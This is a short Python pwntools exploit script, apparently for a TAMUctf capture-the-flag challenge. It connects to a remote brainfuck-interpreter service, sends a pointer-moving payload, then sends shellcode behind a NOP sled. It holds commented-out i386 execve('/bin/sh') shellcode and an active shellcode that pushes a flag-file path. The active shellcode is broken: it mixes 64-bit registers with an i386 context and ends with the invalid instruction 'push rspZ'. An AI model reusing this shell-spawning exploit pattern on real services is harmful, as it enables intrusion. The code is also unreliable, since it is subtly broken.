from pwn import *

context.arch = "i386"

io = remote("challenges.tamuctf.com",31337)
'''
shell  = asm("""
    xor eax,eax
    mov al,0xb
    push 0x0068732f
    push 0x6e69622f
    push esp
    pop ebx
    xor ecx,ecx
    xor edx,edx
    int 0x80
""")
'''

shell = asm("""
    xor rax, rax
    push rax
    mov r9, 0x7478742e67616c66
    push r9
    mov r9, 0x2f6e77702f656d6f
    push r9
    mov cx, 0x682f
    push cx
    push rspZ
""")

shell = "\x90"*100 + shell

payload = ",>"*122 + "<"*100

print len(shell)

io.sendlineafter("bf$ ",payload)
io.sendline(shell)

io.interactive()
